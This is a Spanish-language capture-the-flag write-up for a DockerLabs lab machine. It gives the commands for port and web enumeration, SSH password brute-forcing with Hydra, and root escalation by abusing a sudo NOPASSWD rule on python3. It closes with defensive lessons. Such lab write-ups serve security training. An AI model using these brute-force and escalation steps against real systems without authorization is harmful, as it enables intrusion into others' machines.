ğŸ› DockerLabs Writeup 
ğŸ“Œ InformaciÃ³n General

IP objetivo: 172.17.0.2

Objetivo: Obtener acceso root

Servicios expuestos:

22 â†’ SSH

80 â†’ HTTP

Pista: "Encuentra la clave para A en los archivos."

ğŸ” 1. EnumeraciÃ³n Inicial
ğŸ” Escaneo con Nmap
nmap -sC -sV -p- 172.17.0.2

Resultados relevantes:
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.62 (Debian)


No se detectaron vulnerabilidades crÃ­ticas por versiÃ³n.

ğŸŒ 2. EnumeraciÃ³n Web
WhatWeb
whatweb http://172.17.0.2


Detecta:

Apache 2.4.62

Debian Linux

Nikto
nikto -h http://172.17.0.2


Resultados:

Sin vulnerabilidades explotables

Solo headers faltantes

AnÃ¡lisis Manual

PÃ¡gina HTML estÃ¡tica

Sin formularios

Sin CMS visible

La pista indicaba que la clave estaba en archivos.

ğŸ”‘ 3. Credenciales Iniciales

Se identificaron credenciales con hydra:

Usuario: a
Password: secret

ğŸ” 4. Acceso Inicial por SSH
ssh a@172.17.0.2


Acceso exitoso.

ğŸ” 5. EnumeraciÃ³n Local

Se revisÃ³ el archivo /etc/passwd:

cat /etc/passwd


Se encontrÃ³ otro usuario:

spencer:x:1001:1001::/home/spencer:/bin/bash

ğŸ’£ 6. Fuerza Bruta SSH con Hydra

Se realizÃ³ ataque contra SSH para el usuario spencer.

Uso de Hydra
hydra -l spencer -P wordlist.txt ssh://172.17.0.2


Donde:

-l â†’ usuario especÃ­fico

-P â†’ diccionario de contraseÃ±as

ssh:// â†’ protocolo

Credencial encontrada:
login: spencer
password: password1

ğŸ” 7. Acceso como Spencer
ssh spencer@172.17.0.2


Acceso exitoso.

ğŸš€ 8. Escalada de Privilegios
EnumeraciÃ³n con sudo
sudo -l


Salida:

User spencer may run the following commands:
    (ALL) NOPASSWD: /usr/bin/python3


Esto significa que el usuario puede ejecutar python3 como root sin contraseÃ±a.

ğŸ”¥ 9. ExplotaciÃ³n de sudo mal configurado

Se abusÃ³ del permiso NOPASSWD ejecutando una shell desde Python:

sudo python3 -c 'import os; os.system("/bin/bash")'


VerificaciÃ³n:

id


Resultado:

uid=0(root) gid=0(root)


Root obtenido con Ã©xito.

ğŸ§  Vector Completo de Ataque

EnumeraciÃ³n con Nmap

AnÃ¡lisis web

IdentificaciÃ³n de credenciales (a:secret)

Acceso SSH inicial

EnumeraciÃ³n local

Descubrimiento del usuario spencer

Fuerza bruta SSH con Hydra

Acceso como spencer

EnumeraciÃ³n de sudo

Abuso de python3 con NOPASSWD

Shell root

ğŸ›¡ Lecciones de Seguridad

âŒ No permitir NOPASSWD en binarios interpretables (python, perl, ruby)

âŒ No usar contraseÃ±as dÃ©biles

âŒ No reutilizar credenciales

âœ” Aplicar principio de mÃ­nimo privilegio

âœ” Configurar sudo de forma restrictiva

ğŸ† Resultado Final

âœ” Acceso inicial
âœ” Movimiento lateral
âœ” Escalada a root
âœ” MÃ¡quina comprometida exitosamente

ğŸ“š Herramientas Utilizadas

Nmap

WhatWeb

Nikto

Hydra

SSH

EnumeraciÃ³n manual
